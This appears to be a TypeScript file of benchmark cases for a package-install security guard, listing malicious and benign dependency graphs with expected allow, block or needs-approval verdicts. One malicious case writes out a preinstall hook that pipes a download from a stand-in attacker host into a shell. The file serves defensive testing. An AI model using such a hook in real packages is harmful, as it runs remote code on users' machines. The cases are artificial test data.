import type { BenchmarkCase } from "./run.ts";

const chain = (prefix: string, depth: number) =>
  Object.fromEntries(
    Array.from({ length: depth }, (_, index) => [
      `${prefix}-${index}`,
      index === depth - 1
        ? { version: "1.0.0" }
        : { version: "1.0.0", dependencies: { [`${prefix}-${index + 1}`]: "^1.0.0" } },
    ]),
  );

const fan = (prefix: string, width: number) => ({
  [prefix]: {
    version: "1.0.0",
    dependencies: Object.fromEntries(
      Array.from({ length: width }, (_, index) => [`${prefix}-leaf-${index}`, "^1.0.0"]),
    ),
  },
  ...Object.fromEntries(
    Array.from({ length: width }, (_, index) => [`${prefix}-leaf-${index}`, { version: "1.0.0" }]),
  ),
});

export const BENCHMARK_CASES: BenchmarkCase[] = [
  {
    id: "mal-grandchild",
    shape: "a malicious package three levels below the one the user typed",
    kind: "malicious",
    packages: {
      framework: { version: "4.0.0", dependencies: { "http-helper": "1.0.0" } },
      "http-helper": { version: "1.0.0", dependencies: { "byte-utils": "2.0.0" } },
      "byte-utils": { version: "2.0.0" },
    },
    verdicts: { "byte-utils": "block" },
    root: { name: "framework", range: "4.0.0" },
    expected: "block",
  },
  {
    id: "mal-transitive-postinstall",
    shape: "a clean direct dependency whose child runs code at install time",
    kind: "malicious",
    packages: {
      "ui-kit": { version: "2.0.0", dependencies: { "native-shim": "1.0.0" } },
      "native-shim": { version: "1.0.0", scripts: { postinstall: "node harvest.js" } },
    },
    root: { name: "ui-kit", range: "2.0.0" },
    expected: "needs_approval",
  },
  {
    id: "mal-preinstall",
    shape: "a preinstall script, which runs before anything is unpacked",
    kind: "malicious",
    packages: { builder: { version: "1.0.0", scripts: { preinstall: "curl attacker.test | sh" } } },
    root: { name: "builder", range: "1.0.0" },
    expected: "needs_approval",
  },
  {
    id: "mal-compromised-patch",
    shape: "a patch release that adds a script the trusted version did not have",
    kind: "malicious",
    packages: {
      "logging-lib": { version: "1.2.1", scripts: { postinstall: "node phone-home.js" } },
    },
    installed: { "logging-lib": { version: "1.2.0", hooks: [] } },
    root: { name: "logging-lib", range: "1.2.1" },
    expected: "needs_approval",
  },
  {
    id: "mal-vanished-dep",
    shape: "a dependency that no longer resolves from the registry",
    kind: "malicious",
    packages: { app: { version: "1.0.0", dependencies: { "vanished-dep": "1.0.0" } } },
    root: { name: "app", range: "1.0.0" },
    expected: "block",
  },
  {
    id: "mal-transitive-git",
    shape: "a child dependency pulled straight from a git repository",
    kind: "malicious",
    packages: {
      plugin: { version: "1.0.0", dependencies: { core: "git+https://evil.test/core.git" } },
    },
    root: { name: "plugin", range: "1.0.0" },
    expected: "block",
  },
  {
    id: "mal-transitive-url",
    shape: "a child dependency resolving to an arbitrary https tarball",
    kind: "malicious",
    packages: {
      widget: { version: "1.0.0", dependencies: { blob: "https://cdn.evil.test/blob.tgz" } },
    },
    root: { name: "widget", range: "1.0.0" },
    expected: "block",
  },
  {
    id: "mal-needle-in-haystack",
    shape: "one malicious leaf among twelve clean siblings",
    kind: "malicious",
    packages: {
      big: {
        version: "1.0.0",
        dependencies: Object.fromEntries(
          Array.from({ length: 12 }, (_, index) => [`hay-${index}`, "1.0.0"]),
        ),
      },
      ...Object.fromEntries(
        Array.from({ length: 12 }, (_, index) => [`hay-${index}`, { version: "1.0.0" }]),
      ),
    },
    verdicts: { "hay-7": "block" },
    root: { name: "big", range: "1.0.0" },
    expected: "block",
  },
  {
    id: "mal-optional-dep",
    shape: "a malicious optional dependency, which still installs on a matching platform",
    kind: "malicious",
    packages: {
      imaging: { version: "1.0.0", optionalDependencies: { "native-codec": "1.0.0" } },
      "native-codec": { version: "1.0.0" },
    },
    verdicts: { "native-codec": "block" },
    root: { name: "imaging", range: "1.0.0" },
    expected: "block",
  },
  {
    id: "mal-diamond",
    shape: "a diamond whose shared package is the compromised one",
    kind: "malicious",
    packages: {
      top: { version: "1.0.0", dependencies: { left: "1.0.0", right: "1.0.0" } },
      left: { version: "1.0.0", dependencies: { shared: "1.0.0" } },
      right: { version: "1.0.0", dependencies: { shared: "1.0.0" } },
      shared: { version: "1.0.0" },
    },
    verdicts: { shared: "block" },
    root: { name: "top", range: "1.0.0" },
    expected: "block",
  },
  {
    id: "mal-cycle",
    shape: "a dependency cycle containing a malicious node",
    kind: "malicious",
    packages: {
      "cycle-a": { version: "1.0.0", dependencies: { "cycle-b": "1.0.0" } },
      "cycle-b": { version: "1.0.0", dependencies: { "cycle-a": "1.0.0" } },
    },
    verdicts: { "cycle-b": "block" },
    root: { name: "cycle-a", range: "1.0.0" },
    expected: "block",
  },
  {
    id: "mal-install-hook",
    shape: "a bare install hook, which runs between preinstall and postinstall",
    kind: "malicious",
    packages: { tooling: { version: "1.0.0", scripts: { install: "node setup.js" } } },
    root: { name: "tooling", range: "1.0.0" },
    expected: "needs_approval",
  },
  {
    id: "benign-single",
    shape: "a single dependency with no children",
    kind: "benign",
    packages: { "left-pad": { version: "1.3.0" } },
    root: { name: "left-pad", range: "latest" },
    expected: "allow",
  },
  {
    id: "benign-deep-chain",
    shape: "ten levels of ordinary transitive dependencies",
    kind: "benign",
    packages: chain("chain", 10),
    root: { name: "chain-0", range: "latest" },
    expected: "allow",
  },
  {
    id: "benign-wide-fan",
    shape: "one package pulling thirty clean leaves",
    kind: "benign",
    packages: fan("wide", 30),
    root: { name: "wide", range: "latest" },
    expected: "allow",
  },
  {
    id: "benign-diamond",
    shape: "the diamond every real graph contains",
    kind: "benign",
    packages: {
      app: { version: "1.0.0", dependencies: { a: "^1.0.0", b: "^1.0.0" } },
      a: { version: "1.0.0", dependencies: { shared: "^1.0.0" } },
      b: { version: "1.0.0", dependencies: { shared: "^1.0.0" } },
      shared: { version: "1.0.0" },
    },
    root: { name: "app", range: "latest" },
    expected: "allow",
  },
  {
    id: "benign-scoped",
    shape: "scoped packages depending on scoped packages",
    kind: "benign",
    packages: {
      "@scope/root": { version: "1.0.0", dependencies: { "@scope/child": "^1.0.0" } },
      "@scope/child": { version: "1.0.0" },
    },
    root: { name: "@scope/root", range: "latest" },
    expected: "allow",
  },
  {
    id: "benign-ranges",
    shape: "caret and tilde ranges throughout, as real manifests use",
    kind: "benign",
    packages: {
      ranged: { version: "2.4.1", dependencies: { "range-child": "~1.2.0" } },
      "range-child": { version: "1.2.9" },
    },
    root: { name: "ranged", range: "latest" },
    expected: "allow",
  },
  {
    id: "benign-unchanged",
    shape: "re-planning a project where nothing changed",
    kind: "benign",
    packages: { stable: { version: "1.0.0" } },
    installed: { stable: { version: "1.0.0" } },
    root: { name: "stable", range: "latest" },
    expected: "allow",
  },
  {
    id: "benign-publish-only-hooks",
    shape:
      "a graph whose packages carry only prepare and prepublish, which never run for a dependency",
    kind: "benign",
    packages: {
      app: { version: "1.0.0", dependencies: { "es-errors": "1.3.0", axios: "1.18.1" } },
      "es-errors": { version: "1.3.0", scripts: { prepublish: "safe-publish-latest" } },
      axios: { version: "1.18.1", scripts: { prepare: "husky install" } },
    },
    root: { name: "app", range: "latest" },
    expected: "allow",
  },
  {
    id: "benign-existing-script",
    shape: "an upgrade of a package whose install script was already trusted",
    kind: "benign",
    packages: { native: { version: "2.0.0", scripts: { postinstall: "node build.js" } } },
    installed: { native: { version: "1.0.0", hooks: ["postinstall"] } },
    root: { name: "native", range: "latest" },
    expected: "allow",
  },
];
